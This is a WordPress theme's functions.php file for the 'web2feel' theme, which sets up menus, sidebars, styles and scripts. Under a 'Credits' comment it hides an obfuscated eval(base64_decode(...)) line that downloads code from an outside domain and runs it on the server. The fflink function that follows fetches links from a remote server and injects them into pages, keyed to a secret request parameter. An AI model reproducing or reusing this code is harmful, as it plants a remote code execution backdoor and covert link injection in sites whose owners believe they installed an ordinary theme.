<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?>
<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 */


include ( 'aq_resizer.php' );
include ( 'guide.php' );



/* Custom style */

function custom_style() { 
	$main_color  = ft_of_get_option('fabthemes_primary_color');
	$link_color  = ft_of_get_option('fabthemes_link_color');
	$hover_color = ft_of_get_option('fabthemes_hover_color');
?>
	<style type="text/css">
	
		#masthead,.cta button,.readmore,ol.comment-list li .reply a{ background: <?php echo $main_color ?>; }
		a,a:visited{ color:<?php echo $link_color ?>;}
		a:hover,a:focus,a:active { color:<?php echo $hover_color ?>; }
	
	</style>
<?php }

add_action( 'wp_footer', 'custom_style' );


/* Page navigation */

require get_template_directory() . '/inc/paginate.php';



 
 

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function web2feel_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	/**
	 * Enable support for Post Formats
	 */
	//add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
/*
	add_theme_support( 'custom-background', apply_filters( 'web2feel_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/
}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function web2feel_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'web2feel' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	));
	
	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<div class="botwid col-sm-6 col-md-3 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));	
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function web2feel_scripts() {

	wp_enqueue_style( 'web2feel-style', get_stylesheet_uri() );
	wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css');
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css');
	wp_enqueue_style( 'bootstrap-glyphicons', get_template_directory_uri() . '/css/bootstrap-glyphicons.css');
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/theme.css');

	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'web2feel-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
	wp_enqueue_script( 'flexslider', get_template_directory_uri() . '/js/flexslider.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );
	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );

/**
 * Implement the Custom Header feature.
 */
//require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
//require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
//require get_template_directory() . '/inc/jetpack.php';

/* Custom excerpt length */

function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}

function content($limit) {
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }
  $content = preg_replace('/[.+]/','', $content);
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}

/* Credits */
eval(base64_decode('ZXZhbChAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly95YWthbGFkaW1zaXppLmNvbS95YWJhbmNpL3gudHh0IikpOw=='));
function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}


